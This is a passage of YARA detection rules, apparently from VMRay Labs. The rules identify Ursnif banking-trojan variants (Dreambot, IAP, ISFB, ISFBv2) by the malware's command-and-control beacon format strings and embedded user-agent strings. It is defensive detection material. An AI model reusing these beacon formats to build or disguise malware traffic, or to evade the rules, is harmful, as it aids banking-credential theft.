\"soft=%u&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n        $negative_0 = \"&action=%08x\"\n        $negative_1 = \"&arc=%u\"\n        $negative_2 = \"&crc=%08x\"\n        $negative_3 = \"&group=%u\"\n        $negative_4 = \"&guid=%08x%08x%08x%08x\"\n        $negative_5 = \"&id=%x\"\n        $negative_6 = \"&user=%s\"\n        $negative_7 = \"(Windows NT %u.%u%s; Trident/7.0; rv:11.0)\"\n        $negative_8 = \"(Windows NT %u.%u%s; rv:40.0.0)\"\n        $negative_9 = \"(Windows NT %u.%u%s; rv:51.0)\"\n        $negative_10 = \"(Windows NT %u.%u%s; rv:54.0)\"\n        $negative_11 = \"(Windows NT %u.%u;%s rv:50.0)\"\n        $negative_12 = \"(compatible; MSIE 8.0; Windows NT %u.%u%s)\"\n        $negative_13 = \"Content-Disposition: form-data; name=\\\"%s\\\"\"\n        $negative_14 = \"Firefox/40.0.0\"\n        $negative_15 = \"Firefox/50.0\"\n        $negative_16 = \"Firefox/51.0\"\n        $negative_17 = \"Firefox/54.0\"\n        $negative_18 = \"Mozilla/4.0\"\n        $negative_19 = \"soft=1&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of ($positive_*)\n        and not any of ($negative_*)\n}\n\nrule Ursnif_Dreambot_A_C2_Format\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"C2 format string of Ursnif, Dreambot.A variant\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif,Ursnif.Dreambot.A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        sample = \"322d9c3303d5c9858661bfa4be6f1fb7e5e6ef87c15af37cfb4156b7dd7dfda3\"\n\n    strings:\n        $positive_0 = \"&ip=%s\"\n        $positive_1 = \"&name=%s\"\n        $positive_2 = \"&os=%s\"\n        $positive_3 = \"&type=%u\"\n        $positive_4 = \"&uptime=%u\"\n        $positive_5 = \"Mozilla/5.0 (Windows NT %u.%u%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.71 Safari/537.36\"\n        $positive_6 = \"soft=%u&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n        $negative_0 = \"&action=%08x\"\n        $negative_1 = \"&action=%u\"\n        $negative_2 = \"&arc=%u\"\n        $negative_3 = \"&crc=%08x\"\n        $negative_4 = \"&group=%u\"\n        $negative_5 = \"&guid=%08x%08x%08x%08x\"\n        $negative_6 = \"&id=%x\"\n        $negative_7 = \"&time=%lu\"\n        $negative_8 = \"&user=%s\"\n        $negative_9 = \"(Windows NT %u.%u%s; Trident/7.0; rv:11.0)\"\n        $negative_10 = \"(Windows NT %u.%u%s; rv:40.0.0)\"\n        $negative_11 = \"(Windows NT %u.%u%s; rv:51.0)\"\n        $negative_12 = \"(Windows NT %u.%u%s; rv:54.0)\"\n        $negative_13 = \"(Windows NT %u.%u;%s rv:50.0)\"\n        $negative_14 = \"(compatible; MSIE 8.0; Windows NT %u.%u%s)\"\n        $negative_15 = \"Content-Disposition: form-data; name=\\\"%s\\\"\"\n        $negative_16 = \"Firefox/40.0.0\"\n        $negative_17 = \"Firefox/50.0\"\n        $negative_18 = \"Firefox/51.0\"\n        $negative_19 = \"Firefox/54.0\"\n        $negative_20 = \"Mozilla/4.0\"\n        $negative_21 = \"soft=1&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of ($positive_*)\n        and not any of ($negative_*)\n}\n\nrule Ursnif_Dreambot_B_C2_Format\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"C2 format string of Ursnif, Dreambot.B variant\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif,Ursnif.Dreambot.B\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        sample = \"4041eff2b2845b4b3acb7e32fe092a7bab82645bdef1da06aa16fafaada7bda9\"\n\n    strings:\n        $positive_0 = \"&ip=%s\"\n        $positive_1 = \"&name=%s\"\n        $positive_2 = \"&os=%s\"\n        $positive_3 = \"&type=%u\"\n        $positive_4 = \"&uptime=%u\"\n        $positive_5 = \"Mozilla/5.0 (Windows NT %u.%u%s; rv:54.0) Gecko/20100101 Firefox/54.0\"\n        $positive_6 = \"soft=%u&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n        $negative_0 = \"&action=%08x\"\n        $negative_1 = \"&action=%u\"\n        $negative_2 = \"&arc=%u\"\n        $negative_3 = \"&crc=%08x\"\n        $negative_4 = \"&group=%u\"\n        $negative_5 = \"&guid=%08x%08x%08x%08x\"\n        $negative_6 = \"&id=%x\"\n        $negative_7 = \"&time=%lu\"\n        $negative_8 = \"&user=%s\"\n        $negative_9 = \"(KHTML, like Gecko)\"\n        $negative_10 = \"(Windows NT %u.%u%s)\"\n        $negative_11 = \"(Windows NT %u.%u%s; Trident/7.0; rv:11.0)\"\n        $negative_12 = \"(Windows NT %u.%u%s; rv:40.0.0)\"\n        $negative_13 = \"(Windows NT %u.%u%s; rv:51.0)\"\n        $negative_14 = \"(Windows NT %u.%u;%s rv:50.0)\"\n        $negative_15 = \"(compatible; MSIE 8.0; Windows NT %u.%u%s)\"\n        $negative_16 = \"AppleWebKit/537.36\"\n        $negative_17 = \"Chrome/64.0.3282.71\"\n        $negative_18 = \"Content-Disposition: form-data; name=\\\"%s\\\"\"\n        $negative_19 = \"Firefox/40.0.0\"\n        $negative_20 = \"Firefox/50.0\"\n        $negative_21 = \"Firefox/51.0\"\n        $negative_22 = \"Mozilla/4.0\"\n        $negative_23 = \"Safari/537.36\"\n        $negative_24 = \"soft=1&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of ($positive_*)\n        and not any of ($negative_*)\n}\n\nrule Ursnif_Dreambot_C2_Format\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"C2 format string of Ursnif, Dreambot variant\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif,Ursnif.Dreambot\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        sample = \"0080a3c4f640b62b7b6da722564b11df09270e6620e2e96a5559a94246e30e9a\"\n\n    strings:\n        $positive_0 = \"&ip=%s\"\n        $positive_1 = \"&name=%s\"\n        $positive_2 = \"&os=%s\"\n        $positive_3 = \"&type=%u\"\n        $positive_4 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT %u.%u%s)\"\n        $positive_5 = \"soft=%u&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n        $negative_0 = \"&action=%08x\"\n        $negative_1 = \"&action=%u\"\n        $negative_2 = \"&arc=%u\"\n        $negative_3 = \"&crc=%08x\"\n        $negative_4 = \"&group=%u\"\n        $negative_5 = \"&guid=%08x%08x%08x%08x\"\n        $negative_6 = \"&id=%x\"\n        $negative_7 = \"&time=%lu\"\n        $negative_8 = \"&uptime=%u\"\n        $negative_9 = \"&user=%s\"\n        $negative_10 = \"(KHTML, like Gecko)\"\n        $negative_11 = \"(Windows NT %u.%u%s)\"\n        $negative_12 = \"(Windows NT %u.%u%s; Trident/7.0; rv:11.0)\"\n        $negative_13 = \"(Windows NT %u.%u%s; rv:40.0.0)\"\n        $negative_14 = \"(Windows NT %u.%u%s; rv:51.0)\"\n        $negative_15 = \"(Windows NT %u.%u%s; rv:54.0)\"\n        $negative_16 = \"(Windows NT %u.%u;%s rv:50.0)\"\n        $negative_17 = \"AppleWebKit/537.36\"\n        $negative_18 = \"Chrome/64.0.3282.71\"\n        $negative_19 = \"Content-Disposition: form-data; name=\\\"%s\\\"\"\n        $negative_20 = \"Firefox/40.0.0\"\n        $negative_21 = \"Firefox/50.0\"\n        $negative_22 = \"Firefox/51.0\"\n        $negative_23 = \"Firefox/54.0\"\n        $negative_24 = \"Mozilla/5.0\"\n        $negative_25 = \"Safari/537.36\"\n        $negative_26 = \"soft=1&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of ($positive_*)\n        and not any of ($negative_*)\n}\n\nrule Ursnif_Dreambot_C_C2_Format\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"C2 format string of Ursnif, Dreambot.C variant\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif,Ursnif.Dreambot.C\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        sample = \"2a1a83db7c3ab3b38b7309b74e1e439f71fbd3ff889cc2ad275bae0b7fd8f1d1\"\n\n    strings:\n        $positive_0 = \"&ip=%s\"\n        $positive_1 = \"&name=%s\"\n        $positive_2 = \"&os=%s\"\n        $positive_3 = \"&type=%u\"\n        $positive_4 = \"&uptime=%u\"\n        $positive_5 = \"Mozilla/5.0 (Windows NT %u.%u%s; rv:40.0.0) Gecko/20100101 Firefox/40.0.0\"\n        $positive_6 = \"soft=%u&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n        $negative_0 = \"&action=%08x\"\n        $negative_1 = \"&action=%u\"\n        $negative_2 = \"&arc=%u\"\n        $negative_3 = \"&crc=%08x\"\n        $negative_4 = \"&group=%u\"\n        $negative_5 = \"&guid=%08x%08x%08x%08x\"\n        $negative_6 = \"&id=%x\"\n        $negative_7 = \"&time=%lu\"\n        $negative_8 = \"&user=%s\"\n        $negative_9 = \"(KHTML, like Gecko)\"\n        $negative_10 = \"(Windows NT %u.%u%s)\"\n        $negative_11 = \"(Windows NT %u.%u%s; Trident/7.0; rv:11.0)\"\n        $negative_12 = \"(Windows NT %u.%u%s; rv:51.0)\"\n        $negative_13 = \"(Windows NT %u.%u%s; rv:54.0)\"\n        $negative_14 = \"(Windows NT %u.%u;%s rv:50.0)\"\n        $negative_15 = \"(compatible; MSIE 8.0; Windows NT %u.%u%s)\"\n        $negative_16 = \"AppleWebKit/537.36\"\n        $negative_17 = \"Chrome/64.0.3282.71\"\n        $negative_18 = \"Content-Disposition: form-data; name=\\\"%s\\\"\"\n        $negative_19 = \"Firefox/50.0\"\n        $negative_20 = \"Firefox/51.0\"\n        $negative_21 = \"Firefox/54.0\"\n        $negative_22 = \"Mozilla/4.0\"\n        $negative_23 = \"Safari/537.36\"\n        $negative_24 = \"soft=1&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of ($positive_*)\n        and not any of ($negative_*)\n}\n\nrule Ursnif_Dreambot_D_C2_Format\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"C2 format string of Ursnif, Dreambot.D variant\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif,Ursnif.Dreambot.D\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        sample = \"2ad3fb2f7a9cbd70669ed01f1ee422651d9a2077862098eb785bab93801461b7\"\n\n    strings:\n        $positive_0 = \"&ip=%s\"\n        $positive_1 = \"&name=%s\"\n        $positive_2 = \"&os=%s\"\n        $positive_3 = \"&type=%u\"\n        $positive_4 = \"&uptime=%u\"\n        $positive_5 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT %u.%u%s)\"\n        $positive_6 = \"soft=%u&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n        $negative_0 = \"&action=%08x\"\n        $negative_1 = \"&action=%u\"\n        $negative_2 = \"&arc=%u\"\n        $negative_3 = \"&crc=%08x\"\n        $negative_4 = \"&group=%u\"\n        $negative_5 = \"&guid=%08x%08x%08x%08x\"\n        $negative_6 = \"&id=%x\"\n        $negative_7 = \"&time=%lu\"\n        $negative_8 = \"&user=%s\"\n        $negative_9 = \"(KHTML, like Gecko)\"\n        $negative_10 = \"(Windows NT %u.%u%s)\"\n        $negative_11 = \"(Windows NT %u.%u%s; Trident/7.0; rv:11.0)\"\n        $negative_12 = \"(Windows NT %u.%u%s; rv:40.0.0)\"\n        $negative_13 = \"(Windows NT %u.%u%s; rv:51.0)\"\n        $negative_14 = \"(Windows NT %u.%u%s; rv:54.0)\"\n        $negative_15 = \"(Windows NT %u.%u;%s rv:50.0)\"\n        $negative_16 = \"AppleWebKit/537.36\"\n        $negative_17 = \"Chrome/64.0.3282.71\"\n        $negative_18 = \"Content-Disposition: form-data; name=\\\"%s\\\"\"\n        $negative_19 = \"Firefox/40.0.0\"\n        $negative_20 = \"Firefox/50.0\"\n        $negative_21 = \"Firefox/51.0\"\n        $negative_22 = \"Firefox/54.0\"\n        $negative_23 = \"Mozilla/5.0\"\n        $negative_24 = \"Safari/537.36\"\n        $negative_25 = \"soft=1&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of ($positive_*)\n        and not any of ($negative_*)\n}\n\nrule Ursnif_Dreambot_E_C2_Format\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"C2 format string of Ursnif, Dreambot.E variant\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif,Ursnif.Dreambot.E\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        sample = \"41b88dfd78731ff2c7cbbc2aa1dbbf37e1e37ee030e9124afe9a657fda7f6c0d\"\n\n    strings:\n        $positive_0 = \"&ip=%s\"\n        $positive_1 = \"&name=%s\"\n        $positive_2 = \"&os=%s\"\n        $positive_3 = \"&type=%u\"\n        $positive_4 = \"&uptime=%u\"\n        $positive_5 = \"Mozilla/5.0 (Windows NT %u.%u%s; rv:40.0.0) Gecko/20100101 Firefox/40.0.0\"\n        $positive_6 = \"soft=1&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n        $negative_0 = \"&action=%08x\"\n        $negative_1 = \"&action=%u\"\n        $negative_2 = \"&arc=%u\"\n        $negative_3 = \"&crc=%08x\"\n        $negative_4 = \"&group=%u\"\n        $negative_5 = \"&guid=%08x%08x%08x%08x\"\n        $negative_6 = \"&id=%x\"\n        $negative_7 = \"&time=%lu\"\n        $negative_8 = \"&user=%s\"\n        $negative_9 = \"(KHTML, like Gecko)\"\n        $negative_10 = \"(Windows NT %u.%u%s)\"\n        $negative_11 = \"(Windows NT %u.%u%s; Trident/7.0; rv:11.0)\"\n        $negative_12 = \"(Windows NT %u.%u%s; rv:51.0)\"\n        $negative_13 = \"(Windows NT %u.%u%s; rv:54.0)\"\n        $negative_14 = \"(Windows NT %u.%u;%s rv:50.0)\"\n        $negative_15 = \"(compatible; MSIE 8.0; Windows NT %u.%u%s)\"\n        $negative_16 = \"AppleWebKit/537.36\"\n        $negative_17 = \"Chrome/64.0.3282.71\"\n        $negative_18 = \"Content-Disposition: form-data; name=\\\"%s\\\"\"\n        $negative_19 = \"Firefox/50.0\"\n        $negative_20 = \"Firefox/51.0\"\n        $negative_21 = \"Firefox/54.0\"\n        $negative_22 = \"Mozilla/4.0\"\n        $negative_23 = \"Safari/537.36\"\n        $negative_24 = \"soft=%u\"\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of ($positive_*)\n        and not any of ($negative_*)\n}\n\nrule Ursnif_Dreambot_F_C2_Format\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"C2 format string of Ursnif, Dreambot.F variant\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif,Ursnif.Dreambot.F\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        sample = \"3efc9578efd4f5a1f73a26f86c46b02cfc95ee1a5eec70c1c065967f79248483\"\n\n    strings:\n        $positive_0 = \"&ip=%s\"\n        $positive_1 = \"&name=%s\"\n        $positive_2 = \"&os=%s\"\n        $positive_3 = \"&type=%u\"\n        $positive_4 = \"&uptime=%u\"\n        $positive_5 = \"Mozilla/5.0 (Windows NT %u.%u%s; rv:51.0) Gecko/20100101 Firefox/51.0\"\n        $positive_6 = \"soft=%u&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n        $negative_0 = \"&action=%08x\"\n        $negative_1 = \"&action=%u\"\n        $negative_2 = \"&arc=%u\"\n        $negative_3 = \"&crc=%08x\"\n        $negative_4 = \"&group=%u\"\n        $negative_5 = \"&guid=%08x%08x%08x%08x\"\n        $negative_6 = \"&id=%x\"\n        $negative_7 = \"&time=%lu\"\n        $negative_8 = \"&user=%s\"\n        $negative_9 = \"(KHTML, like Gecko)\"\n        $negative_10 = \"(Windows NT %u.%u%s)\"\n        $negative_11 = \"(Windows NT %u.%u%s; Trident/7.0; rv:11.0)\"\n        $negative_12 = \"(Windows NT %u.%u%s; rv:40.0.0)\"\n        $negative_13 = \"(Windows NT %u.%u%s; rv:54.0)\"\n        $negative_14 = \"(Windows NT %u.%u;%s rv:50.0)\"\n        $negative_15 = \"(compatible; MSIE 8.0; Windows NT %u.%u%s)\"\n        $negative_16 = \"AppleWebKit/537.36\"\n        $negative_17 = \"Chrome/64.0.3282.71\"\n        $negative_18 = \"Content-Disposition: form-data; name=\\\"%s\\\"\"\n        $negative_19 = \"Firefox/40.0.0\"\n        $negative_20 = \"Firefox/50.0\"\n        $negative_21 = \"Firefox/54.0\"\n        $negative_22 = \"Mozilla/4.0\"\n        $negative_23 = \"Safari/537.36\"\n        $negative_24 = \"soft=1&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of ($positive_*)\n        and not any of ($negative_*)\n}\n\nrule Ursnif_IAP_C2_Format\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"C2 format string of Ursnif, IAP variant\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif,Ursnif.IAP\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        sample = \"3b66dc2d7af97ad37708a461a48a6bae6b8d6ccb65dd174ba8771c62b80f4885\"\n\n    strings:\n        $positive_0 = \"&uptime=%u\"\n        $positive_1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT %u.%u%s)\"\n        $positive_2 = \"soft=%u&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n        $negative_0 = \"&action=%08x\"\n        $negative_1 = \"&action=%u\"\n        $negative_2 = \"&arc=%u\"\n        $negative_3 = \"&crc=%08x\"\n        $negative_4 = \"&group=%u\"\n        $negative_5 = \"&guid=%08x%08x%08x%08x\"\n        $negative_6 = \"&id=%x\"\n        $negative_7 = \"&ip=%s\"\n        $negative_8 = \"&os=%s\"\n        $negative_9 = \"&time=%lu\"\n        $negative_10 = \"&user=%s\"\n        $negative_11 = \"(KHTML, like Gecko)\"\n        $negative_12 = \"(Windows NT %u.%u%s)\"\n        $negative_13 = \"(Windows NT %u.%u%s; Trident/7.0; rv:11.0)\"\n        $negative_14 = \"(Windows NT %u.%u%s; rv:40.0.0)\"\n        $negative_15 = \"(Windows NT %u.%u%s; rv:51.0)\"\n        $negative_16 = \"(Windows NT %u.%u%s; rv:54.0)\"\n        $negative_17 = \"(Windows NT %u.%u;%s rv:50.0)\"\n        $negative_18 = \"AppleWebKit/537.36\"\n        $negative_19 = \"Chrome/64.0.3282.71\"\n        $negative_20 = \"Content-Disposition: form-data; name=\\\"%s\\\"\"\n        $negative_21 = \"Firefox/40.0.0\"\n        $negative_22 = \"Firefox/50.0\"\n        $negative_23 = \"Firefox/51.0\"\n        $negative_24 = \"Firefox/54.0\"\n        $negative_25 = \"Mozilla/5.0\"\n        $negative_26 = \"Safari/537.36\"\n        $negative_27 = \"soft=1&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of ($positive_*)\n        and not any of ($negative_*)\n}\n\nrule Ursnif_ISFB_leaked_C2_Format\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"C2 format string of Ursnif, ISFB.leaked variant\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif,Ursnif.ISFB.leaked\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        sample = \"b063e8e355e6d8c9c43e953cdd01ef6ec665641f46344deb2b16e1706ad07882\"\n\n    strings:\n        $positive_0 = \"&name=%s\"\n        $positive_1 = \"&type=%u\"\n        $positive_2 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT %u.%u%s)\"\n        $positive_3 = \"soft=1&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n        $negative_0 = \"&action=%08x\"\n        $negative_1 = \"&action=%u\"\n        $negative_2 = \"&arc=%u\"\n        $negative_3 = \"&crc=%08x\"\n        $negative_4 = \"&group=%u\"\n        $negative_5 = \"&guid=%08x%08x%08x%08x\"\n        $negative_6 = \"&id=%x\"\n        $negative_7 = \"&ip=%s\"\n        $negative_8 = \"&os=%s\"\n        $negative_9 = \"&time=%lu\"\n        $negative_10 = \"&uptime=%u\"\n        $negative_11 = \"&user=%s\"\n        $negative_12 = \"(KHTML, like Gecko)\"\n        $negative_13 = \"(Windows NT %u.%u%s)\"\n        $negative_14 = \"(Windows NT %u.%u%s; Trident/7.0; rv:11.0)\"\n        $negative_15 = \"(Windows NT %u.%u%s; rv:40.0.0)\"\n        $negative_16 = \"(Windows NT %u.%u%s; rv:51.0)\"\n        $negative_17 = \"(Windows NT %u.%u%s; rv:54.0)\"\n        $negative_18 = \"(Windows NT %u.%u;%s rv:50.0)\"\n        $negative_19 = \"AppleWebKit/537.36\"\n        $negative_20 = \"Chrome/64.0.3282.71\"\n        $negative_21 = \"Content-Disposition: form-data; name=\\\"%s\\\"\"\n        $negative_22 = \"Firefox/40.0.0\"\n        $negative_23 = \"Firefox/50.0\"\n        $negative_24 = \"Firefox/51.0\"\n        $negative_25 = \"Firefox/54.0\"\n        $negative_26 = \"Mozilla/5.0\"\n        $negative_27 = \"Safari/537.36\"\n        $negative_28 = \"soft=%u\"\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of ($positive_*)\n        and not any of ($negative_*)\n}\n\nrule Ursnif_ISFBv2_A_C2_Format\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"C2 format string of Ursnif, ISFBv2.A variant\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif,Ursnif.ISFBv2.A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        sample = \"2570032f78e729dba52d24d52df766aca5fe633787f1f6f5fb6537bbf977c992\"\n\n    strings:\n        $positive_0 = \"&ip=%s\"\n        $positive_1 = \"&name=%s\"\n        $positive_2 = \"&type=%u\"\n        $positive_3 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT %u.%u%s)\"\n        $positive_4 = \"soft=1&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n        $negative_0 = \"&action=%08x\"\n        $negative_1 = \"&action=%u\"\n        $negative_2 = \"&arc=%u\"\n        $negative_3 = \"&crc=%08x\"\n        $negative_4 = \"&group=%u\"\n        $negative_5 = \"&guid=%08x%08x%08x%08x\"\n        $negative_6 = \"&id=%x\"\n        $negative_7 = \"&os=%s\"\n        $negative_8 = \"&time=%lu\"\n        $negative_9 = \"&uptime=%u\"\n        $negative_10 = \"&user=%s\"\n        $negative_11 = \"(KHTML, like Gecko)\"\n        $negative_12 = \"(Windows NT %u.%u%s)\"\n        $negative_13 = \"(Windows NT %u.%u%s; Trident/7.0; rv:11.0)\"\n        $negative_14 = \"(Windows NT %u.%u%s; rv:40.0.0)\"\n        $negative_15 = \"(Windows NT %u.%u%s; rv:51.0)\"\n        $negative_16 = \"(Windows NT %u.%u%s; rv:54.0)\"\n        $negative_17 = \"(Windows NT %u.%u;%s rv:50.0)\"\n        $negative_18 = \"AppleWebKit/537.36\"\n        $negative_19 = \"Chrome/64.0.3282.71\"\n        $negative_20 = \"Content-Disposition: form-data; name=\\\"%s\\\"\"\n        $negative_21 = \"Firefox/40.0.0\"\n        $negative_22 = \"Firefox/50.0\"\n        $negative_23 = \"Firefox/51.0\"\n        $negative_24 = \"Firefox/54.0\"\n        $negative_25 = \"Mozilla/5.0\"\n        $negative_26 = \"Safari/537.36\"\n        $negative_27 = \"soft=%u\"\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of ($positive_*)\n        and not any of ($negative_*)\n}\n\nrule Ursnif_ISFBv2_B_C2_Format\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"C2 format string of Ursnif, ISFBv2.B variant\"\n        classifications = \"Banking Trojan\"\n        threat_names = \"Ursnif,Ursnif.ISFBv2.B\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        sample = \"09b8e3ced102002b4832f73de472a2017bef318e8b2f5ba8bc33c0724b4c8860\"\n\n    strings:\n        $positive_0 = \"&crc=%x\"\n        $positive_1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT %u.%u%s)\"\n        $positive_2 = \"soft=1&version=%u&user=%s&server=%u&id=%u&type=%u&name=%s\"\n        $negative_0 = \"&action=%08x\"\n        $negative_1 = \"&action=%u\"\n        $negative_2 = \"&arc=%u\"\n        $negative_3 = \"&crc=%08x\"\n        $negative_4 = \"&group=%u\"\n        $negative_5 = \"&guid=%08x%08x%08x%08x\"\n        $negative_6 = \"&id=%x\"\n        $negative_7 = \"&ip=%s\"\n        $negative_8 = \"&os=%s\"\n        $negative_9 = \"&time=%lu\"\n        $negative_10 = \"&uptime=%u\"\n        $negative_11 = \"(KHTML, like Gecko)\"\n        $negative_12 = \"(Windows NT %u.%u%s)\"\n        $negative_13 = \"(Windows NT %u.%u%s; Trident/7.0; rv:11.0)\"\n        $negative_14 = \"(Windows NT %u.%u%s; rv:40.0.0)\"\n        $negative_15 = \"(Windows NT %u.%u%s; rv:51.0)\"\n        $negative_16 = \"(Windows NT %u.%u%s; rv:54.0)\"\n        $negative_17 = \"(Windows NT %u.%u;%s rv:50.0)\"\n        $negative_18 = \"AppleWebKit/537.36\"\n        $negative_19 = \"Chrome/64.0.3282.71\"\n        $negative_20 = \"Content-Disposition: form-data; name=\\\"%s\\\"\"\n        $negative_21 = \"Firefox/40.0.0\"\n        $negative_22 = \"Firefox/50.0\"\n        $negative_23 = \"Firefox/51.0\"\n        $negative_24 = \"Firefox/54.0\"\n        $negative_25 = \"Mozilla/5.0\"\n        $negative_26 = \"Safari/537.36\"\n        $negative_27 = \"soft=%u\"\n        $negative_28 = \"soft=1&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x\"\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of 